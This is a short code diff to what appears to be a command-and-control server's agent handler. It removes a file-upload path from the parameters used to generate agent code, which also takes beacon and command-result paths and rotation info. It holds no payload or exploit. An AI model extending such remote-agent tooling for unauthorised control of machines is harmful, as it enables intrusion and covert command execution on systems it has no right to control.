@@ -13,12 +13,11 @@ class AgentHandler(BaseHandler):
         current_paths = self.path_router.get_current_paths()
         rotation_info = self.path_router.get_rotation_info()
         
-        # Generate the agent code - with updated parameter passing matching the new signature
+        # Generate the agent code with simplified parameters
         agent_code = generate_agent_code(
             server_address=server_address, 
             beacon_path=current_paths["beacon_path"],
             cmd_result_path=current_paths["cmd_result_path"],
-            file_upload_path=current_paths["file_upload_path"],
             rotation_info=rotation_info
         )
 
